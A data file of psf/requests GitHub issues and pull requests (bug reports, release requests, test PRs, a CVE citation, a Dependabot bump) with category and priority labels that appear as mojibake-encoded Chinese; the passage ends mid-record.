3084543992,fix(headers): content-length shouldnt be set to 0 for all body-less methods,"Currently we use `self.method not in (""GET"", ""HEAD"")` to determine ""methods that can have a body but don't provide one""

However, there are other [HTTP methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods) that cannot have a body.
Servers can consider it an error if Content-Length=0 when no data is expected. For example, the [Sanic server's position](https://github.com/sanic-org/sanic/issues/2915#issuecomment-2029785788).

MUST have body: PATCH, POST, PUT
MUST NOT have body: GET, HEAD, [TRACE](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.8-4)
SHOULD NOT have body (no official use): [CONNECT](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.6-13), [DELETE](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.5-6), [OPTIONS](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.7-6)

Proposing that Content-Length be set to 0 when there's no data, only for PATCH, POST, PUT methods since those must have content. DELETE should not have content although it seems most common out of the ""SHOULD NOT"" category so we can grandfather it in.","Bugåé¦ˆ, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6953
3083150353,New release,"Hi,

Could you tell me, please, if you plan any new releases soon?
The latest versions is about one year old, and our code analyzers complain about this raising a high operational risk.
So I am just curious now, what are your plans.",å…¶ä»–,é«˜,https://github.com/psf/requests/issues/6952
3080771183,docs: fix dead links to kenreitz.org,"I noticed a few dead links. Looking back through the [wayback machine](https://web.archive.org/web/20220203091232/https://kenreitz.org/essays/2012/06/14/the-future-of-python-http), I was able to find the new location of these articles.","Bugåé¦ˆ, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6951
3079446521,digest  bug,"```py
import requests
from requests.auth import HTTPDigestAuth
# è®¤è¯å‡­æ®
USERNAME = ""Default User""
PASSWORD = ""robotics""

# åˆ›å»ºä¸€ä¸ªä¿æŒä¼šè¯å’ŒCookiesçš„å¯¹è±¡
session = requests.Session()

# è®¾ç½®ç›®æ ‡URL
url = ""http://127.0.0.1:80/subscription""

# å‡†å¤‡POSTæ•°æ®
post_data = {
    ""resources"": ""1"",
    ""1"":""/rw/panel/ctrlstate"",
    ""1-p"":""0""
}

try:
    # å‘é€å¸¦Digestè®¤è¯çš„POSTè¯·æ±‚
    post_response = session.post(
        url,
        data=post_data,
        auth=HTTPDigestAuth(USERNAME, PASSWORD)
    )
    post_response.raise_for_status()

    print(f""POSTå“åº”çŠ¶æ€ç : {post_response.status_code}"")
    print(""POSTè¯·æ±‚åçš„Cookies:"")
    print(session.cookies.get_dict())
    print(""\nå“åº”å†…å®¹:"")
    print(post_response.text)
    # å‘é€å¸¦ç›¸åŒè®¤è¯çš„GETè¯·æ±‚
    get_response = session.get(
        url,
        auth=HTTPDigestAuth(USERNAME, PASSWORD)
    )
    get_response.raise_for_status()

    print(f""\nGETå“åº”çŠ¶æ€ç : {get_response.status_code}"")
    print(""GETè¯·æ±‚åçš„Cookies:"")
    print(session.cookies.get_dict())
    print(""\nå“åº”å†…å®¹:"")
    print(get_response.text)

except requests.exceptions.HTTPError as http_err:
    print(f""HTTPé”™è¯¯å‘ç”Ÿ: {http_err}"")
    if post_response.status_code == 401:
        print(""è®¤è¯å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç”¨æˆ·åå¯†ç "")
except requests.exceptions.RequestException as req_err:
    print(f""è¯·æ±‚å¼‚å¸¸: {req_err}"")
except Exception as e:
    print(f""å…¶ä»–é”™è¯¯: {e}"")
```


```
POSTçŠ¶æ€ç : 201
POST Cookies:
-http-session-=23::http.session::5ed62c3908feb133b8a771f64e631c5a
ABBCX=53

POSTå“åº”å†…å®¹:
<?xml version=""1.0"" encoding=""utf-8""?><html xmlns=""http://www.w3.org/1999/xhtml""> <head> <title>Event</title><base href=""http://localhost:80/""/> </head> <body>  <div class=""state""><a href=""subscription/24"" rel=""group""></a><a href=""ws://localhost:80/poll/24"" rel=""self""></a><a href=""subscription/24?action=show"" rel=""action""></a> <ul> <li class=""pnl-ctrlstate-ev"" title=""ctrlstate""><a href=""/rw/panel/ctrlstate"" rel=""self""></a><span class=""ctrlstate"">motoron</span></li>  </ul> </div> </body></html>

GETçŠ¶æ€ç : 200
GET Cookies:
-http-session-=23::http.session::5ed62c3908feb133b8a771f64e631c5a
ABBCX=54

GETå“åº”å†…å®¹:
<?xml version=""1.0"" encoding=""utf-8""?><html xmlns=""http://www.w3.org/1999/xhtml""> <head> <title>Groups</title> <base href=""http://localhost:80/subscription/""/></head> <body> <div class=""state""><a href="""" rel=""self""></a><a href=""?action=show"" rel=""action""></a><ul></ul></div></body></html>
```


ABBCX Error","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6950
3077733650,QuickStart documentation error,"httpbin post has a header item '""X-Amzn-Trace-Id"" which causes an result which is contrary to the  documentation. 

## Quickstart documentation 
### ""More complicated POST requests""
```
payload_tuples = [('key1', 'value1'), ('key1', 'value2')]
r1 = requests.post('https://httpbin.org/post', data=payload_tuples)
payload_dict = {'key1': ['value1', 'value2']}
r2 = requests.post('https://httpbin.org/post', data=payload_dict)
print(r1.text)
{
  ...
  ""form"": {
    ""key1"": [
      ""value1"",
      ""value2""
    ]
  },
  ...
}
r1.text == r2.text
True
```

## Actual Result

<!-- What happened instead. -->

## Reproduction Steps

```python
import requests
payload_tuples = [('key1', ' ""value1'),('key1', 'value2')]
payload_dict = {'key1': ['value1', 'value2']}
r1 = requests.post('https://httpbin.org/post', data=payload_tuples)
r2 = requests.post('https://httpbin.org/post', data=payload_dict)
r1.text == r2.text
False
r1.json()['form'] == r2.json()['form']
True

```

## Diagnostic Information

pprint.pprint(r1.text)
('{â€¦
 '  ""form"": {\n'
 '    ""key1"": [\n'
 '      ""value1"", \n'
 '      ""value2""\n'
 '    ]}
â€¦
 '    ""X-Amzn-Trace-Id"": ""Root=1-682cb364-67bf5e846c56c77e24839642""\n'
 'â€¦ },
â€¦

pprint.pprint(r2.text)
('{â€¦
 '  ""form"": {\n'
 '    ""key1"": [\n'
 '      ""value1"", \n'
 '      ""value2""\n'
 '    ]}
â€¦
 '    ""X-Amzn-Trace-Id"": ""Root=1-682cb30f-208ede8e2eda5cf75cf578ac""\n'
 ' â€¦ }, 
 â€¦
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6949
3054039817,"Add enhancements: Advanced Retry Mechanism, Middleware System, and Enhanced Timeout Controls","## Summary of Implemented Features

1. Request/Response Middleware System:
- Created a flexible middleware framework for processing requests and responses
- Implemented common middleware classes (logging, timing, headers, etc.)
- Added support for custom middleware

2. Enhanced Timeout Controls:
- Added granular timeout controls for different phases of the request (connect, read, write)
- Implemented timeout strategies for retries (constant, linear, exponential)
- Integrated with the existing retry system

3. Advanced Retry Mechanism (previously implemented):
- Added support for different backoff strategies
- Implemented customizable retry conditions
- Added respect for Retry-After headers","åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/pull/6948
3052530154,verify=False crashes on py3.13 on windows (FileNotFoundError),"I have a tests where I do `self._session.verify = False` to my requests session, it fails:

```
src\ansys\simai\core\api\mixin.py:99: in _get
    return self._request(""GET"", url, *args, **kwargs)
src\ansys\simai\core\api\mixin.py:149: in _request
    self._session.request(method, full_url, *args, **kwargs),
.venv\Lib\site-packages\requests\sessions.py:589: in request
    resp = self.send(prep, **send_kwargs)
.venv\Lib\site-packages\requests\sessions.py:746: in send
    r.content
.venv\Lib\site-packages\requests\models.py:902: in content
    self._content = b"""".join(self.iter_content(CONTENT_CHUNK_SIZE)) or b""""
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

    def generate():
        # Special case for urllib3.
        if hasattr(self.raw, ""stream""):
            try:
                yield from self.raw.stream(chunk_size, decode_content=True)
            except ProtocolError as e:
>               raise ChunkedEncodingError(e)
E               requests.exceptions.ChunkedEncodingError: (""Connection broken: FileNotFoundError(2, 'No such file or directory')"", FileNotFoundError(2, 'No such file or directory'))
```

See action run: https://github.com/ansys/pysimai/actions/runs/14931636639/job/41949246539
See the same test without `self._session.verify = False`: https://github.com/ansys/pysimai/actions/runs/14932156717/job/41951055780


## Expected Result

`session.verify = False` works.

## Actual Result

`session.verify = False` causes `FileNotFoundError`.

## Reproduction Steps

TODO (the only windows env I have except github actions is the great windows XP)","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/issues/6947
3045850311,[Security] Medium Severity Vulnerability (CVE-2015-2296) in Requests v2.32.3,"A potential medium-severity security issue has been identified in the requests library, version 2.32.3, due to indirect implications of https://github.com/advisories/GHSA-pg2w-x9wp-vw92.

The resolve_redirects function in sessions.py in requests 2.1.0 through 2.5.3 allows remote attackers to conduct session fixation attacks via a cookie without a host value in a redirect.

References:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2296
https://nvd.nist.gov/vuln/detail/CVE-2015-2296","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/issues/6946
3043475439,`SSLCertVerificationError` when fetching `https://od.moi.gov.tw/api/v1/`,"Fetching API under `https://od.moi.gov.tw/api/v1/` raises an `SSLCertVerificationError`, while no certificate issue is reported when opening the same URL in the browser (latest Chrome or Firefox).

## Expected Result

No error should be raised.

## Actual Result

An error is raised: `requests.exceptions.SSLError: HTTPSConnectionPool(host='od.moi.gov.tw', port=443): Max retries exceeded with url: /api/v1/rest/datastore/A01010000C-002150-013?limit=1 (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Missing Subject Key Identifier (_ssl.c:1028)')))`

## Reproduction Steps

```python
import requests
import certifi
url = 'https://od.moi.gov.tw/api/v1/rest/datastore/A01010000C-002150-013?limit=1'
requests.get(url, verify=certifi.where())
```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": ""5.2.0""
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.2""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.13.3""
  },
  ""platform"": {
    ""release"": ""10"",
    ""system"": ""Windows""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30000100""
  },
  ""urllib3"": {
    ""version"": ""2.4.0""
  },
  ""using_charset_normalizer"": false,
  ""using_pyopenssl"": false
}
```
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/issues/6945
3040883809,Project Control / Ownership,"In light of this tweet (https://x.com/kennethreitz42/status/1919466982467940750):

<img width=""602"" alt=""Image"" src=""https://github.com/user-attachments/assets/ed8e8541-90fc-4506-aaa8-4aebed881dc1"" />

Does Kenneth Reitz have the permissions required to remove this project from GitHub and/or PyPI?
",è´¦å·é—®é¢˜,ä¸­,https://github.com/psf/requests/issues/6944
3040037398,Error de red o descarga: ('Connection broken: IncompleteRead (ayuda no puedo descargar .zip de copernicus)  thanks!,"import requests
import pandas as pd
import geopandas as gpd
from shapely.geometry import shape
from requests.exceptions import RequestException
import time

# Credenciales
copernicus_user = ""usuario_name""
copernicus_password = ""password""
client_id = ""cdse-public""

# Ãrea de interÃ©s (WKT)
ft = ""POLYGON((-6.305113 37.195728, -6.305113 37.205728, -6.295113 37.205728, -6.295113 37.195728, -6.305113 37.195728))""

# ColecciÃ³n y fechas
data_collection = ""SENTINEL-2""
start_date = ""2025-04-24""
end_date = ""2025-04-25""

# Tile especÃ­fico a descargar
tile_to_download = ""S2B_MSIL2A_20250425T110619_N0511_R137_T29SQB_20250425T140306.SAFE""

# FunciÃ³n para obtener tokens
def get_tokens(username=None, password=None, refresh_token=None):
    url = ""https://identity.dataspace.copernicus.eu/auth/realms/CDSE/protocol/openid-connect/token""
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    if refresh_token:
        data = {
            ""grant_type"": ""refresh_token"",
            ""refresh_token"": refresh_token,
            ""client_id"": client_id
        }
    else:
        data = {
            ""grant_type"": ""password"",
            ""username"": username,
            ""password"": password,
            ""client_id"": client_id
        }

    r = requests.post(url, headers=headers, data=data)
    r.raise_for_status()
    token_json = r.json()
    return token_json[""access_token""], token_json.get(""refresh_token"")

# Obtener tokens inicialmente
try:
    access_token, refresh_token = get_tokens(username=copernicus_user, password=copernicus_password)
except Exception as e:
    print(""âŒ Error autenticando:"", e)
    exit()

# Consultar catÃ¡logo
print(""ğŸ” Consultando catÃ¡logo..."")
catalog_url = (
    f""https://catalogue.dataspace.copernicus.eu/odata/v1/Products?""
    f""$filter=Collection/Name eq '{data_collection}' and ""
    f""OData.CSC.Intersects(area=geography'SRID=4326;{ft}') and ""
    f""ContentDate/Start ge {start_date}T00:00:00.000Z and ""
    f""ContentDate/Start le {end_date}T23:59:59.999Z&$count=True&$top=1000""
)

response = requests.get(catalog_url)
products = response.json().get(""value"", [])

if not products:
    print(""âš ï¸ No se encontraron productos."")
    exit()

# Procesar productos
df = pd.DataFrame(products)
df[""geometry""] = df[""GeoFootprint""].apply(shape)
gdf = gpd.GeoDataFrame(df, geometry=""geometry"")
gdf = gdf[~gdf[""Name""].str.contains(""L1C"")]  # Solo L2A

print(f""ğŸ“¦ Total escenas L2A encontradas: {len(gdf)}"")
for name in gdf[""Name""]:
    print("" -"", name)

# Filtrar tile deseado
tile = gdf[gdf[""Name""] == tile_to_download]

if tile.empty:
    print(f""âš ï¸ Tile no encontrado: {tile_to_download}"")
    exit()

row = tile.iloc[0]
session = requests.Session()
session.headers.update({""Authorization"": f""Bearer {access_token}""})

# Iniciar descarga
try:
    print(f""\nâ¬‡ï¸ Descargando: {row['Name']}"")
    url = f""https://catalogue.dataspace.copernicus.eu/odata/v1/Products({row['Id']})/$value""
    response = session.get(url, allow_redirects=False)

    # Seguir redirecciones
    while response.status_code in (301, 302, 303, 307):
        url = response.headers[""Location""]
        response = session.get(url, allow_redirects=False)

    # Si el token ha vencido, intentar renovarlo
    if response.status_code == 401 and refresh_token:
        print(""ğŸ” Token vencido, renovando..."")
        try:
            access_token, refresh_token = get_tokens(refresh_token=refresh_token)
            session.headers.update({""Authorization"": f""Bearer {access_token}""})
            response = session.get(url, allow_redirects=False)
            while response.status_code in (301, 302, 303, 307):
                url = response.headers[""Location""]
                response = session.get(url, allow_redirects=False)
        except Exception as e:
            print(""âŒ Error al renovar el token:"", e)
            exit()

    # Descargar archivo final
    file = session.get(url, verify=False, stream=True)
    file.raise_for_status()

    filename = f""{row['Name']}.zip""
    with open(filename, ""wb"") as f:
        for chunk in file.iter_content(chunk_size=1024 * 1024):  # 1 MB
            if chunk:
                f.write(chunk)

    print(f""âœ… Descarga completa: {filename}"")

except RequestException as e:
    print(""âŒ Error de red o descarga:"", e)
except Exception as e:
    print(""âŒ Error inesperado:"", e)
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/issues/6943
3039592617,[Security] Medium Severity Vulnerability (CVE-2015-2296) in Requests v2.32.3,"A potential medium-severity security issue has been identified in the requests library, version 2.32.3, due to indirect implications of CVE-2015-2296.

The resolve_redirects function in sessions.py in requests 2.1.0 through 2.5.3 allows remote attackers to conduct session fixation attacks via a cookie without a host value in a redirect.

*References:*
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2296
https://nvd.nist.gov/vuln/detail/CVE-2015-2296","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/issues/6942
3037081068,tests: add trailing-slash mount behavior tests (#6935),"Closes #6935 

**What** Added two new pytest functions to cover: 
- mounting with a trailing slash matches only that exact prefix 
- mounting without a trailing slash still yields the adapter but warns in docs 

**Why** 
Ensures documented â€œgood first issueâ€ behavior is tested, prevents regressions in URL-prefix matching logic.","Bugåé¦ˆ, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6941
3026200627,3.0,,å…¶ä»–,ä¸­,https://github.com/psf/requests/pull/6940
3025643272,Bump actions/setup-python from 5.5.0 to 5.6.0,"Bumps [actions/setup-python](https://github.com/actions/setup-python) from 5.5.0 to 5.6.0.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/actions/setup-python/releases"">actions/setup-python's releases</a>.</em></p>
<blockquote>
<h2>v5.6.0</h2>
<h2>What's Changed</h2>
<ul>
<li>Workflow updates related to Ubuntu 20.04 by <a href=""https://github.com/aparnajyothi-y""><code>@â€‹aparnajyothi-y</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1065"">actions/setup-python#1065</a></li>
<li>Fix for Candidate Not Iterable Error by <a href=""https://github.com/aparnajyothi-y""><code>@â€‹aparnajyothi-y</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1082"">actions/setup-python#1082</a></li>
<li>Upgrade semver and <code>@â€‹types/semver</code> by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1091"">actions/setup-python#1091</a></li>
<li>Upgrade prettier from 2.8.8 to 3.5.3 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1046"">actions/setup-python#1046</a></li>
<li>Upgrade ts-jest from 29.1.2 to 29.3.2 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1081"">actions/setup-python#1081</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/setup-python/compare/v5...v5.6.0"">https://github.com/actions/setup-python/compare/v5...v5.6.0</a></p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/actions/setup-python/commit/a26af69be951a213d495a4c3e4e4022e16d87065""><code>a26af69</code></a> Bump ts-jest from 29.1.2 to 29.3.2 (<a href=""https://redirect.github.com/actions/setup-python/issues/1081"">#1081</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/30eafe95483bd95135b7eda0c66a0369af9afdf1""><code>30eafe9</code></a> Bump prettier from 2.8.8 to 3.5.3 (<a href=""https://redirect.github.com/actions/setup-python/issues/1046"">#1046</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/5d95bc16d4bc83bb56202da9630d84c6f8a2d8f5""><code>5d95bc1</code></a> Bump semver and <code>@â€‹types/semver</code> (<a href=""https://redirect.github.com/actions/setup-python/issues/1091"">#1091</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/6ed2c67c8abe7646815dbd50364eea862d396fd9""><code>6ed2c67</code></a> Fix for Candidate Not Iterable Error (<a href=""https://redirect.github.com/actions/setup-python/issues/1082"">#1082</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/e348410e00f449ece8581cb8e88be8f0e7712da6""><code>e348410</code></a> Remove Ubuntu 20.04 from workflows due to deprecation from 2025-04-15 (<a href=""https://redirect.github.com/actions/setup-python/issues/1065"">#1065</a>)</li>
<li>See full diff in <a href=""https://github.com/actions/setup-python/compare/8d9ed9ac5c53483de85588cdf95a591a75ab9f55...a26af69be951a213d495a4c3e4e4022e16d87065"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=actions/setup-python&package-manager=github_actions&previous-version=5.5.0&new-version=5.6.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot show <dependency name> ignore conditions` will show all of the ignore conditions of the specified dependency
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6939
3021925694,Bug: URL parameters lost when hash fragment exists,"## é—®é¢˜æè¿°  
URLä¸­åŒ…å«`#`æ—¶ï¼Œ`?`åçš„æŸ¥è¯¢å‚æ•°è¢«é”™è¯¯ä¸¢å¼ƒ  

## å¤ç°æ­¥éª¤  
```python
import requests
r = requests.get(""http://example.com?key=value#fragment"")
print(r.url)  # å®é™…è¾“å‡ºï¼šhttp://example.com/","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6938
3013653517,ci: update to ubuntu-24.04 in workflow,"### Related issue
https://github.com/actions/runner-images/issues/11101

### What does this PR do?
Update workflow OS versions to ubuntu-24.04, version 20.04 is no longer allowed on GitHub action making ci lint broke e.g.:
https://github.com/psf/requests/actions/runs/14607511655/job/40981665101?pr=6936","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/pull/6937
3012427324,test: add two more tests exercising the adapter,"This PR adds two test cases for `Session.mount()` to cover the documentation's recommendation about trailing slashes in prefixes (see #6935). 

The first test `test_session_get_adapter_prefix_with_trailing_slash` verifies that prefixes with a trailing / (e.g., https://example.com/) match only the intended hostname. 

The second test `test_session_get_adapter_prefix_without_trailing_slash` verifies that prefixes without a trailing / (e.g., https://example.com) match both the intended hostname and extended hostnames (e.g., https://example.com.other.com), as warned in the docs. 

Together, these tests ensure the longest prefix match behavior is well-documented and stable.","Bugåé¦ˆ, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6936
3011843632,tests: add trailing slashes to mount to match docs recommendation?,"I was digging into the docs and noticed this:
> The adapter will be chosen based on a longest prefix match. Be mindful prefixes such as http://localhost will also match http://localhost.other.com or http://localhost@other.com. Itâ€™s recommended to terminate full hostnames with a /.

[link](https://requests.readthedocs.io/en/latest/user/advanced/)

While checking out some tests that uses the `Session.mount()`, I saw that a few donâ€™t follow this recommendation. For example, in test_session_get_adapter_prefix_matching  (https://github.com/psf/requests/blob/main/tests/test_requests.py#L1620):

```python
prefix = ""https://example.com""  # no trailing slash
more_specific_prefix = prefix + ""/some/path""  # no trailing slash
...
s.mount(prefix, prefix_adapter)
s.mount(more_specific_prefix, more_specific_prefix_adapter)
```

I know that the tests work great and do their job, but adding trailing slashes (e.g., https://example.com/ and https://example.com/some/path/) would align them with the docs and make the prefixes more precise.

Here are the tests I noticed:
- test_transport_adapter_ordering
- test_session_get_adapter_prefix_matching
- test_session_get_adapter_prefix_matching_mixed_case
- test_session_get_adapter_prefix_matching_is_case_insensitive

Would it be worth opening a PR to update these to include trailing slashes? The tests would stay the same, just following the docs best practice.","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜",é«˜,https://github.com/psf/requests/issues/6935
2990503801,Test regressions with urllib3 2.4.0 on Python 3.13,"<!-- Summary. -->

## Expected Result

(all tests pass)

## Actual Result

```
====================================== short test summary info =======================================
FAILED tests/test_requests.py::TestRequests::test_proxy_error - Failed: DID NOT RAISE <class 'requests.exceptions.ProxyError'>
FAILED tests/test_requests.py::TestRequests::test_pyopenssl_redirect - requests.exceptions.SSLError: HTTPSConnectionPool(host='127.0.0.1', port=36165): Max retries exce...
FAILED tests/test_requests.py::TestRequests::test_auth_is_stripped_on_http_downgrade - requests.exceptions.SSLError: HTTPSConnectionPool(host='127.0.0.1', port=36165): Max retries exce...
FAILED tests/test_requests.py::TestPreparingURLs::test_different_connection_pool_for_tls_settings_verify_bundle_unexpired_cert - requests.exceptions.SSLError: HTTPSConnectionPool(host='localhost', port=43243): Max retries exce...
============ 4 failed, 586 passed, 15 skipped, 1 xfailed, 18 warnings in 71.93s (0:01:11) ============
```

## Reproduction Steps

```
$ git clone https://github.com/psf/requests
$ cd requests
$ git checkout v2.32.3
$ tox -e py313
```

Observe the output from â€œActual result,â€ above.

Now, try upper-bounding the version of `urllib3` as an experiment:

```diff
diff --git a/setup.py b/setup.py
index 1b0eb377..97baee5f 100755
--- a/setup.py
+++ b/setup.py
@@ -61,7 +61,7 @@ if sys.argv[-1] == ""publish"":
 requires = [
     ""charset_normalizer>=2,<4"",
     ""idna>=2.5,<4"",
-    ""urllib3>=1.21.1,<3"",
+    ""urllib3>=1.21.1,<2.4.0"",
     ""certifi>=2017.4.17"",
 ]
 test_requirements = [
```

```
$ tox -e py313
====================================== short test summary info =======================================
FAILED tests/test_requests.py::TestRequests::test_proxy_error - Failed: DID NOT RAISE <class 'requests.exceptions.ProxyError'>
============ 1 failed, 589 passed, 15 skipped, 1 xfailed, 18 warnings in 77.36s (0:01:17) ============
```

This appears to confirm that three of the failing tests are associated with the upgrade from `urllib3` 2.3.0 to 2.4.0.

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.1""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.13.2""
  },
  ""platform"": {
    ""release"": ""6.13.9-200.fc41.x86_64"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30200040""
  },
  ""urllib3"": {
    ""version"": ""2.4.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥",é«˜,https://github.com/psf/requests/issues/6934
2988095433,Next release,"Dear Maintainer,

Our projects depends on requests lib. 
Our internal tool (Blackduck) has reported an operational issue as there is no release from the repo since long time.

We noticed that there are many PRs, and if they could incorporate into a minor release, it would be of great help.
We could then upgrade to newer version of requests lib.

Can you please let us know the timeline of upcoming release.

We appreciate your response at the earliest!","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",é«˜,https://github.com/psf/requests/issues/6933
2988014915,[Query] Is there any plan to release out a new version of requests lib in 2025?,"Dear requests lib contributor,

Our projects depends **requests** lib a lot, and we want to know if there is a plan to release out a new version in 2025, so that we can upgrade our dependency to the latest version of requests lib.

Thanks a lot for your response in advance!
",åŠŸèƒ½å»ºè®®,é«˜,https://github.com/psf/requests/issues/6932
2987624777,Deadlock with geaddrinfo(),"I am using flask app that is served by gunicorn and it has to send requests to third-party APIs, but from time to time I am experiencing deadlocks leading to leaving the gunicorn process in RAM.

For now I am mitigating the issue with sending the IP address of the third-party API server. I observe the issue with python 3.7 (bare metal) and python 3.10 (docker).

When using `dig` all is good and site resolves each time.

One of my services in this app is using socket logging module
https://docs.python.org/3/library/logging.handlers.html#sockethandler

## Expected Result

Request is sent and response is consumed.

## Actual Result
Deadlock - dump from py-spy
```
Thread 1724128 (idle): ""MainThread""
    getaddrinfo (socket.py:752)
    create_connection (urllib3/util/connection.py:72)
    _new_conn (urllib3/connection.py:175)
    connect (urllib3/connection.py:358)
    _validate_conn (urllib3/connectionpool.py:1042)
    _make_request (urllib3/connectionpool.py:386)
    urlopen (urllib3/connectionpool.py:710)
    send (requests/adapters.py:499)
    send (requests/sessions.py:701)
    request (requests/sessions.py:587)
    request (requests/api.py:59)
    post (requests/api.py:115)
```

## Reproduction Steps

Can't provide exact steps because it happens at random times

## System Information

    $ python -m requests.help

bare metal
```
{
  ""chardet"": {
    ""version"": ""3.0.4""
  },
  ""charset_normalizer"": {
    ""version"": ""3.0.1""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""2.6""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.7.17""
  },
  ""platform"": {
    ""release"": ""5.4.0-148-generic"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.28.2""
  },
  ""system_ssl"": {
    ""version"": ""1010106f""
  },
  ""urllib3"": {
    ""version"": ""1.26.14""
  },
  ""using_charset_normalizer"": false,
  ""using_pyopenssl"": false
}
```
docker
```
{
  ""chardet"": {
    ""version"": ""5.2.0""
  },
  ""charset_normalizer"": {
    ""version"": ""3.3.2""
  },
  ""cryptography"": {
